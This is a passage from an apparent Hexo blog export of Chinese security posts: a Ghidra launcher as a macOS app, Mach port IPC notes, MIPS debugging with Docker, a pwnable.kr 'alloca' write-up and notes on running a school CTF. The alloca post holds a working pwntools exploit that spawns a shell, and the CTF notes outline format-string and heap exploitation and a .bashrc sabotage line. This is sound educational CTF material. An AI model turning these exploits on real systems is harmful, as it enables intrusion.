]]></content>
      <categories>
        <category>环境配置踩坑</category>
      </categories>
      <tags>
        <tag>macOS</tag>
        <tag>环境配置</tag>
        <tag>ESXi</tag>
      </tags>
  </entry>
  <entry>
    <title>make-script-to-macOS App</title>
    <url>/2020/08/07/make-script-to-macOS-App/</url>
    <content><![CDATA[<h2 id="0x00-需求"><a href="#0x00-需求" class="headerlink" title="0x00 : 需求"></a>0x00 : 需求</h2><p>主要是Ghidra这个东西，每次启动都要命令行 <code>GhidraRun</code>，太麻烦了，所以就想把这个启动脚本封装成一个macOS的APP，方便使用。</p>
<span id="more"></span>



<h2 id="0x01-过程"><a href="#0x01-过程" class="headerlink" title="0x01 : 过程"></a>0x01 : 过程</h2><p>直接使用了 <a href="https://gist.github.com/mathiasbynens/674099">别人写好的appfiy.sh</a> ，我用的是原作者的，链接里的是二次开发的，其实本质是一样的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">APPNAME=<span class="variable">$&#123;2:-$(basename &quot;<span class="variable">$&#123;1&#125;</span>&quot; &#x27;.sh&#x27;)&#125;</span>;</span><br><span class="line">DIR=<span class="string">&quot;<span class="variable">$&#123;APPNAME&#125;</span>.app/Contents/MacOS&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -a <span class="string">&quot;<span class="variable">$&#123;APPNAME&#125;</span>.app&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">4<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;PWD&#125;</span>/<span class="variable">$&#123;APPNAME&#125;</span>.app already exists :(&quot;</span>;</span><br><span class="line">4<span class="built_in">exit</span> 1;</span><br><span class="line"><span class="keyword">fi</span>;</span><br><span class="line"></span><br><span class="line">mkdir -p <span class="string">&quot;<span class="variable">$&#123;DIR&#125;</span>&quot;</span>;</span><br><span class="line">cp <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;DIR&#125;</span>/<span class="variable">$&#123;APPNAME&#125;</span>&quot;</span>;</span><br><span class="line">chmod +x <span class="string">&quot;<span class="variable">$&#123;DIR&#125;</span>/<span class="variable">$&#123;APPNAME&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;PWD&#125;</span>/<span class="variable">$APPNAME</span>.app&quot;</span>;</span><br></pre></td></tr></table></figure>



<p>因为macOS下app本质是一个目录，所以只需要按照特定的格式构建这个目录即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">❯ <span class="built_in">cd</span> /Applications/Ghidra.app</span><br><span class="line">╭─    /Applications/Ghidra.app ·· ✔  at 12:51:35 </span><br><span class="line">╰─</span><br><span class="line">❯ ls</span><br><span class="line">Contents Icon?</span><br><span class="line">❯ tree .</span><br><span class="line">.</span><br><span class="line">├── Contents</span><br><span class="line">│   └── MacOS</span><br><span class="line">│       └── Ghidra</span><br><span class="line">└── Icon\r</span><br></pre></td></tr></table></figure>

<p>本来我是把ghrida的启动脚本直接放进来的，但是发现有一些目录的问题，索性直接绝对路径启动这个脚本好了(懒省事儿啊 hhh)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------</span></span><br><span class="line"><span class="comment"># Ghidra launch</span></span><br><span class="line"><span class="comment">#----------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/Users/muhe/Tools/ghidra/ghidraRun</span><br></pre></td></tr></table></figure>



<p>最后，图标可以先复制你想用的图片，然后对app右键，get info，点击信息栏上面的小图标，之后cmd+v就行了，也挺方便。</p>
<p>最后，就可以很舒服的启动了。</p>
<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 : 参考"></a>0x02 : 参考</h2><p><a href="https://mathiasbynens.be/notes/shell-script-mac-apps">shell-script-mac-apps</a></p>
]]></content>
      <categories>
        <category>环境配置踩坑</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>macOS IPC Study basic</title>
    <url>/2019/08/20/macOS-IPC-Study-basic/</url>
    <content><![CDATA[<p>算是个读书笔记吧，把利用Port进行IPC的这个过程转成自己的理解。</p>
<a id="more"></a>



<h2 id="Scenario-1-Alice-amp-amp-Bob"><a href="#Scenario-1-Alice-amp-amp-Bob" class="headerlink" title="Scenario 1 : Alice &amp;&amp; Bob"></a>Scenario 1 : Alice &amp;&amp; Bob</h2><p>Alice 提前知道Bob，即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Alice processes a &#96;SEND&#96; right to a port whose &#96;RECEIVE&#96; right is held by Bob.</span><br></pre></td></tr></table></figure>

<ol>
<li>Alice 创建一个临时port，她对这个port有 <code>RECEIVE</code>right</li>
<li>Alice 对创建的port添加 <code>SEND</code>right</li>
<li>Alice 使用提前知晓的对其有 <code>SEND</code>right的port，把她刚创建的临时port向Bob发过去</li>
<li>Bob接收到这个Alice创建的port之后，Bob可以利用这个port和Alice通信，因为这个临时port有 <code>SEND</code>right 和 <code>RECEIVE</code>right</li>
</ol>
<h2 id="Scenario-2-Bootstrap-server-regstrain"><a href="#Scenario-2-Bootstrap-server-regstrain" class="headerlink" title="Scenario 2 : Bootstrap server (regstrain)"></a>Scenario 2 : Bootstrap server (regstrain)</h2><p>场景1有点类似先有鸡和先有蛋的问题，即最开始Alice咋知道Bob的(最开始 <code>SEND</code>right 的port哪里来的？)，所以这里引入了一个中间人— <code>bootstrap</code></p>
<p>Bob:</p>
<ol>
<li>Bob 对 <code>bootstrap</code>server 持有 <code>SEND right</code>port</li>
<li>Bob 创建另外的port，对其有 <code>RECEIV right</code>, 并且对其创建 <code>SEND right</code>，然后利用最开始对 <code>bootstrap</code>持有的 <code>SEND RIGHT</code>port，把新创建的这个 <code>SEND right</code>发过去。</li>
<li>同时，发送过去的 <code>SEND right</code>有一个别名，可以方便索引到这个 <code>SEND right</code>，这里叫 <code>com.apple.Bob</code></li>
</ol>
<p>Alice:</p>
<ol>
<li>同样的，Alice对 <code>bootstrap server</code>，持有 <code>SEND right</code>port</li>
<li>Alice发送消息给 <code>bootstrap server</code>，查询 <code>com.apple.Bob</code>，想要获取对Bob的 <code>SEND right</code></li>
<li><code>bootstrap server</code>接收到之后，根据Alice提供的别名查询，找到之后，返回对应的 <code>SEND right</code>给Alice</li>
<li>至此，Alice可以使用获得的这个 <code>SEND right</code>和Bob通信了(别忘了上面说的，Bob对这个port有 <code>RECEIVE right</code>)</li>
</ol>
<h2 id="Scenario-3-Bootstrap-server-check-in"><a href="#Scenario-3-Bootstrap-server-check-in" class="headerlink" title="Scenario 3: Bootstrap server (check-in)"></a>Scenario 3: Bootstrap server (check-in)</h2><p>这种比较麻烦，出于安全考虑的设计 ： bootstrap server 怎么确定这个服务的确就是真的服务呢？而不是某个别有用心的程序冒充的呢？</p>
<ol>
<li>系统初始化的时候，bootstrap server 初始化所有的服务，对这些服务有 <code>RECEIVE right</code></li>
<li>Alice通过 <code>bootstrap_lookup()</code>想要获取想要的服务(com.apple.Bob)的 <code>SEND right</code></li>
<li>此时，bootstrap server拿到了这个请求，此时Bob这个服务还不存在，这个时候需要bootstrap server 使用 <code>fork()``exec()</code>等api产生这个服务（当然权限也要设计好）</li>
<li>此时Bob存在了，醒来了，他使用 <code>bootstrap_check_in()</code>向 <code>bootstrap server</code>申请对自己服务的port的 <code>RECEIVE right</code></li>
<li>bootstrap server会对这个申请的port(此时Bob是它唯一的拥有者)创建 <code>SEND right</code>，然后发送给Alice</li>
<li>至此，两人可以通信了</li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>*OS Internals Volume I User Mode – Jonathan Levin</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>macOS</tag>
        <tag>IPC</tag>
      </tags>
  </entry>
  <entry>
    <title>mips程序调试环境折腾</title>
    <url>/2018/04/19/mips%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%8A%98%E8%85%BE/</url>
    <content><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 : 起因"></a>0x00 : 起因</h4><p>比赛遇到了，帮学弟折腾调试环境，中间踩坑无数，但是最后还是解决了，就记录下。</p>
<a id="more"></a>

<h4 id="0x01-最初尝试"><a href="#0x01-最初尝试" class="headerlink" title="0x01 : 最初尝试"></a>0x01 : 最初尝试</h4><p>最初尝试在Linux虚拟机里，qemu + gdbserver的搞事情，但是，依赖问题太闹心了，各种交叉编译的蛋疼事情。</p>
<p>所以就放弃了。</p>
<h4 id="0x02-docker专治环境搭建"><a href="#0x02-docker专治环境搭建" class="headerlink" title="0x02 : docker专治环境搭建"></a>0x02 : docker专治环境搭建</h4><p>后来想了想，我为啥不用docker神器，肯定有人和我一样不想弄交叉编译环境，所以肯定搞了这样的镜像～</p>
<p>Google搜索一大堆之后：</p>
<ol>
<li><p><a href="https://hub.docker.com/r/skysider/multiarch-docker/">multiarch-docker</a></p>
</li>
<li><p><a href="https://hub.docker.com/r/blukat29/cross/">cross</a></p>
</li>
</ol>
<p>这两个还不错，我选择了第一个来使用。</p>
<h4 id="0x03-使用过程"><a href="#0x03-使用过程" class="headerlink" title="0x03 : 使用过程"></a>0x03 : 使用过程</h4><h5 id="1-获取所需镜像"><a href="#1-获取所需镜像" class="headerlink" title="1. 获取所需镜像"></a>1. 获取所需镜像</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull skysider/multiarch-docker</span><br></pre></td></tr></table></figure>

<h5 id="2-启动"><a href="#2-启动" class="headerlink" title="2. 启动"></a>2. 启动</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker run -it \</span><br><span class="line">    --rm \</span><br><span class="line">    -h baby_mips \</span><br><span class="line">    --name baby_mips \</span><br><span class="line">    -v $(<span class="built_in">pwd</span>):/ctf/work \</span><br><span class="line">    -P \</span><br><span class="line">    --cap-add=SYS_PTRACE \</span><br><span class="line">    skysider/multiarch-docker</span><br></pre></td></tr></table></figure>

<h5 id="3-复制文件"><a href="#3-复制文件" class="headerlink" title="3. 复制文件"></a>3. 复制文件</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker cp ~/Downloads/baby_mips.dms 207187a8a24d:/tmp/</span><br></pre></td></tr></table></figure>

<h5 id="4-调试"><a href="#4-调试" class="headerlink" title="4. 调试"></a>4. 调试</h5><p>这里需要开两个bash，在启动容器的时候已经有一个bahs了，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a </span><br></pre></td></tr></table></figure>

<p>看看当前这个容器的id，然后：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it id /bin/bash</span><br></pre></td></tr></table></figure>

<p>得到两个bash，一个运行程序，一个gdb窗口。</p>
<p>运行程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -g 2333 ./demo</span><br></pre></td></tr></table></figure>

<p>gdb调试端口是2333</p>
<p>gdb窗口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./demo</span><br></pre></td></tr></table></figure>

<p>然后gdb里</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">target remote localhost:2333</span><br></pre></td></tr></table></figure>

<p>gdb里好像不用set arch了，pwngdb插件自动识别了好像 囧</p>
<h5 id="5-have-fun"><a href="#5-have-fun" class="headerlink" title="5. have fun"></a>5. have fun</h5><p>Enjoy your debug journey~</p>
]]></content>
      <categories>
        <category>环境配置踩坑</category>
      </categories>
      <tags>
        <tag>debug</tag>
        <tag>mips</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr -- alloca</title>
    <url>/2016/08/14/pwnable-kr-alloca/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>好久没玩了…去年十月以后就没玩过了TAT 这几天把peach的坑，winafl的坑填了下，就来搞下pwn。</p>
<a id="more"></a>
<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><p>这个程序是给了源码的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear_newlines</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        c = getchar();</span><br><span class="line">    &#125;<span class="keyword">while</span> (c != <span class="string">'\n'</span> &amp;&amp; c != EOF);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> g_canary;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_canary</span><span class="params">(<span class="keyword">int</span> canary)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = canary ^ g_canary;</span><br><span class="line">    <span class="keyword">int</span> canary_after = canary;</span><br><span class="line">    <span class="keyword">int</span> canary_before = g_canary;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"canary before using buffer : %d\n"</span>, canary_before);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"canary after using buffer : %d\n\n"</span>, canary_after);</span><br><span class="line">    <span class="keyword">if</span>(result != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"what the f...??? how did you fucked this buffer????\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I told you so. its trivially easy to prevent BOF :)\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"therefore as you can see, it is easy to make secure software\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line"><span class="keyword">char</span>* <span class="built_in">buffer</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- BOF(buffer overflow) is very easy to prevent. here is how to.\n\n"</span>);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"   1. allocate the buffer size only as you need it\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"   2. know your buffer size and limit the input length\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- simple right?. let me show you.\n\n"</span>);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- whats the maximum length of your buffer?(byte) : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;<span class="built_in">size</span>);</span><br><span class="line">    clear_newlines();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"- give me your random canary number to prove there is no BOF : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;g_canary);</span><br><span class="line">        clear_newlines();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- ok lets allocate a buffer of length %d\n\n"</span>, <span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">buffer</span> = alloca( <span class="built_in">size</span> + <span class="number">4</span> );    <span class="comment">// 4 is for canary</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- now, lets put canary at the end of the buffer and get your data\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- don't worry! fgets() securely limits your input after %d bytes :)\n"</span>, <span class="built_in">size</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- if canary is not changed, we can prove there is no BOF :)\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"$ "</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="built_in">buffer</span>+<span class="built_in">size</span>, &amp;g_canary, <span class="number">4</span>);    <span class="comment">// canary will detect overflow.</span></span><br><span class="line">    fgets(<span class="built_in">buffer</span>, <span class="built_in">size</span>, <span class="built_in">stdin</span>);        <span class="comment">// there is no way you can exploit this.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- now lets check canary to see if there was overflow\n\n"</span>);</span><br><span class="line">    check_canary( *((<span class="keyword">int</span>*)(<span class="built_in">buffer</span>+<span class="built_in">size</span>)) );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要还是需要突破他的防护，拿到shell。<br>看下bin文件开了什么保护：<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/pwnable.kr_alloca.png"><br>调试发现，check_canary()函数返回的时候，如果恰当的设置g_canary的值，就可以控制返回地值。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/pwnable.kr_alloca1.png"><br>然后我就卡在这里了…开启了NX，只能ROP的思路搞，但是ROP链又不知道哪里放置。</p>
<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02:"></a>0x02:</h4><p>后来参考了别人的做法，才发现这是个本地利用…直接按照以前玩overthewire学来的套路就可以：sc放在环境变量离，然后确定地址，直接改返回地值过去就可以了。<br>不过首先要利用ulimit -s unlimited去固定下libc的加载地址，然后才可以确定system()和/bin/sh地址。</p>
<p>附上我本地调试的时候的exp，环境不同，所以地址可能不同。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">off_system  = <span class="number">0x0003d3e0</span>    <span class="comment"># objdump -d /lib/i386-linux-gnu/libc.so.6 | grep system</span></span><br><span class="line">off_shell   = <span class="number">0x0015ea69</span>    <span class="comment"># grep -oba /bin/sh /lib/i386-linux-gnu/libc.so.6</span></span><br><span class="line">adr_libc    = <span class="number">0x40047000</span>    <span class="comment"># ldd alloca</span></span><br><span class="line">adr_payload = <span class="number">0x40025857</span>    <span class="comment"># searchmem "AAAA"</span></span><br><span class="line">payload     =   p32(adr_libc + off_system)</span><br><span class="line">payload     +=  p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload     +=  p32(adr_libc + off_shell)</span><br><span class="line"><span class="comment">#test = "AAAABBBBCCCC"</span></span><br><span class="line"><span class="comment">#p = process('./alloca', env = &#123;'LD_PRELOAD': test&#125;)</span></span><br><span class="line">p = process(<span class="string">'./alloca'</span>, env = &#123;<span class="string">'LD_PRELOAD'</span>: payload&#125;)</span><br><span class="line"><span class="comment">#raw_input("$$")</span></span><br><span class="line">p.sendline(str(<span class="number">-92</span>))</span><br><span class="line">p.sendline(str((adr_payload + <span class="number">4</span>) ^ <span class="number">0x08048250</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x40025857 ^ 0x08048250 --&gt; 0x4806da07</span></span><br><span class="line"><span class="string">Cannot access memory at address 0x4806da03</span></span><br><span class="line"><span class="string">0x40025857 + 4</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<h4 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03:参考链接"></a>0x03:参考链接</h4><p><a href="http://0byjwzsf.me/2016/08/08/pwnable-rookiss-alloca/#more">0byjwzsf</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>wargame</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnhub杯CUIT第十三届校赛pwn出题及运维心得</title>
    <url>/2017/05/29/pwnhub%E6%9D%AFCUIT%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E6%A0%A1%E8%B5%9Bpwn%E5%87%BA%E9%A2%98%E5%8F%8A%E8%BF%90%E7%BB%B4%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00: 前言"></a>0x00: 前言</h4><p>​    这次应该是我参与的第三次校赛了，第一次大一的时候是参赛者，和柠檬、K1n9还有管理小姐姐组队；后面两次都是以出题者身份参与，在出题中学习到了很多。第一次出题的时候太naive…也没参与运维，都是学长在做配置、维护，这次自己上阵，虽然准备了不少，但是还是有很多问题暴露出来。</p>
<p>​    这次文章涉及出题心得，出题中的一些思考、反思；运维中的一些问题，以及对问题的解决和以后的预防方案。</p>
<a id="more"></a>

<h4 id="0x01-出题心得"><a href="#0x01-出题心得" class="headerlink" title="0x01:出题心得"></a>0x01:出题心得</h4><h5 id="1-pwn50-python-jail"><a href="#1-pwn50-python-jail" class="headerlink" title="1. pwn50 python jail"></a>1. pwn50 python jail</h5><p>​    这是一个python jail，题目是根据一个以前的ctf改的，我过滤了一些函数、字符，熟悉一点python的同学就能容易绕过，使用getattr去做函数调用。算是一个送分题吧 233333。</p>
<h5 id="2-pwn100-lemon-water"><a href="#2-pwn100-lemon-water" class="headerlink" title="2. pwn100 lemon water"></a>2. pwn100 lemon water</h5><p>​    本来pwn100是学弟的…后面出了点问题，他甩锅了TAT。 我就想着随便出一个吧，就放了这么一个format string的盲打。</p>
<p>​    这种题目的思路也很简单，先用%p，确定arch，然后再确定输入在stack的位置，这次这个题目是%6$，后面的就很简单了，dump出来bin file，然后确定got表，有了fmt这种任意地址读的，构造leak就可以拿system地址了，后面直接hijacking printf got，输入一个/bin/sh，就拿shell啦~</p>
<p>​    但是这种题目以后最好不要出，一是没什么意思，二是对服务器的资源消耗很严重，很容易gg。这是自己的问题，背锅背锅…这个题目出的不好TAT  不过顺手黑了一波lemon同学 233333</p>
<h5 id="3-pwn200-file-share"><a href="#3-pwn200-file-share" class="headerlink" title="3. pwn200 file share"></a>3. pwn200 file share</h5><p>​    先说下这个题目的想法吧。开始是基友byg0ne写的一个file share，我拿来修改的，他那个程序是解析http的，有点类似server上运行一个python -m EasyHTTPServer 这种，wget去获取文件。</p>
<p>​     对于这样的一个程序怎么塞进去两个洞呢？我首先想到ngnix那个BROP，解析http的时候栈溢出，嗯…我可以写进去一个login功能，然后有这个漏洞。另外需要一个泄露，怎么做呢？之前看了长亭杨博士的三个漏洞搞定路由器，提到了snprintf的滥用导致heap info leak，我也加了进去。所以原本的题目是这样的…但是后来测试的时候发现，信息泄露可以正常玩，泄露了堆信息，然后根据offset 和一些泄露出来的信息，能确定libc base addr，提供libc.so，就能拿到需要的信息了。但是问题出在栈溢出部分，想增加一个crack canary，然后再让他dup改标准输入输出，然后ROP拿shell…死在crack canary了，一些不可显字符接收有问题-。- 就gg了</p>
<p>​    deadline逼近，我就改了题目…一下子改简单了，我背锅…还造成多解情况。</p>
<p>​    修改后题目的原本设想：fmt 泄露程序加载地址，确定get flag函数地址，crack canary，然后覆盖返回地值拿到flag。但是socket这种！fork server的啊，不重启加载地址一样的啊，可以无限fmt leak的啊TAT</p>
<p>结果就是…一个fmt就可以撸了。。泄露完了直接fmt 日返回地值</p>
<p>​    这个题目如果按照原本思路可能更好一点。或者这个题目去掉get flag函数，给libc，可以让泄露完了之后通过offset拿到dup，改标准输入输出，然后ROP拿shell。</p>
<h5 id="4-pwn300-notebook"><a href="#4-pwn300-notebook" class="headerlink" title="4. pwn300 notebook"></a>4. pwn300 notebook</h5><p>​    常规的heap题目，很简单。塞进去了堆溢出、UAF、释放后的heap未清空。</p>
<p>​    利用的话，利用fastbin的去leak info，然后堆溢出hijacking 函数指针，UAF 调用释放后的块中的方法get shell。很常规的一道题目吧，感觉也没啥难度….师傅们秒的贼快。</p>
<h5 id="5-pwn400-amp-amp-pwn500"><a href="#5-pwn400-amp-amp-pwn500" class="headerlink" title="5. pwn400 &amp;&amp; pwn500"></a>5. pwn400 &amp;&amp; pwn500</h5><p>ox9a82学弟的题目，关注<a href="http://www.cnblogs.com/Ox9A82/">他的博客</a>就好啦~他会写的很详细。</p>
<p>题目出的很有质量，heap玩出了花，但是代码量挺大的，可能有些地方没测试到，出漏了也是有可能的 23333</p>
<p>膜一发9a82大佬 XD</p>
<h4 id="0x02-运维"><a href="#0x02-运维" class="headerlink" title="0x02:运维"></a>0x02:运维</h4><p>不运维不知道辛苦啊…配服务器的时候觉得自己简直是个智障一样。</p>
<ol>
<li>选择使用socat还是xinetd</li>
</ol>
<p>纠结再三使用了socat，其实都差不多，socat更简单一点。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nohup socat TCP-LISTEN:50004,fork,reuseaddr EXEC:<span class="string">&#x27;/home/pwn400/pwn400&#x27;</span> &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>大概这样的吧，具体的其他需求可以看socat文档去修改。</p>
<ol start="2">
<li>权限问题</li>
</ol>
<p>啥也别说了所有写权限都ban掉，命令也做好权限，最好只留下ls cd cat这三个。</p>
<p>还有就是，我开始忘记给.bashrc去掉w权限了，被joker师傅写了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> :p ;<span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>

<p>我服务都没起来…一脸懵逼的问了他，后面改了改…师傅又给我上了一课TAT</p>
<p>还有就是pwn 服务相关文件最好加上chattr +a一下…</p>
<ol start="3">
<li>其他</li>
</ol>
<p>fork bomb这个真是没想到…结果被joker师傅pwn50打进来，fork bomb搞崩了好几次…后面改了配置文件，限制用户启的进程数目，重启之后好了一点。但是这样有个问题就是，当socat 启动的进程到一定数目之后，到了设置的max值，就起不来进程啦，就要重启服务了，很麻烦。最好的办法是，题目里都写上alarm，但是问题是像pwn100那种，没法这么干…比较尴尬，写个crontab自动重启好了</p>
<ol start="4">
<li>流量</li>
</ol>
<p>抓流量就是为了反作弊，事实证明这次抓流量帮了大忙。呵呵， 现在CTF风气这样，我能怎么办，我也很绝望，我就是要怼。</p>
<p>部署了tcpdump，写了crontab去抓流量，以小时为单位。</p>
<p>当然了，这种方案不是很好，而且这次题目没token，导致我后面分析流量类死了，一个包一个包的看。以后的话可以参考杭电explore师傅的黑域，流量抓的更全，直接存数据库里，方便check。</p>
<ol start="5">
<li>自动化啊自动化</li>
</ol>
<p>一定要做好自动化，比如服务重启(比如那个pwn100)，写crontab自动重启，要不然好累啊，觉都睡不好。</p>
<h4 id="0x03-随便瞎bb"><a href="#0x03-随便瞎bb" class="headerlink" title="0x03: 随便瞎bb"></a>0x03: 随便瞎bb</h4><p>CTF风气慢慢变得很差，拿这次pwn50我抓到的流量来说，有这几种情况：</p>
<ol>
<li>payload 几乎一样的</li>
<li>没有任何尝试直接使用关键函数去命令执行的</li>
<li>只是随便交互的，一点意义都没，但是那个ip又提交了flag，可能是学校原因吧出口ip一样。</li>
<li>那些提交时间间隔不到1min、3min的。</li>
</ol>
<p>爱怎么搞怎么搞吧。</p>
<p>我不懂，那是个python的jail啊，你不尝试我过滤了哪些字符，哪些函数，怎么确定用getattr的？</p>
<p>去买彩票吧同学，中了大奖记得分我 233333</p>
<h4 id="0x04-结束语"><a href="#0x04-结束语" class="headerlink" title="0x04: 结束语"></a>0x04: 结束语</h4><p>​    比赛还是办的没啥大的问题，也学到很多东西，知道自己很多不足，以后多学习。感谢师傅们的支持、包容和理解。比赛时间比较尴尬，对不住大家了，导致很多师傅没来玩，比较遗憾，我们的锅TAT</p>
<p>​    还有就是通过比赛又认识了一波师傅，比如nonick这位，非常强<del>以后多交流学习 -。-  又可以进步啦</del></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>yocto writeup</title>
    <url>/2016/10/25/yocto-writeup/</url>
    <content><![CDATA[<pre><code>之前学习ret 2 dl-resolve的时候的记录，第一次遇到这种类型的题目应该是joker师傅给CCTF出的题目，之后师傅给了我yocto这个题目，并给了我他的exp，我根据一些文章+师傅的exp搞定了这个题目的利用。</code></pre>
<a id="more"></a>

<hr>
<h4 id="0x00-分析"><a href="#0x00-分析" class="headerlink" title="0x00:分析"></a>0x00:分析</h4><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/yocto/1.png"><br>程序逻辑很简单。</p>
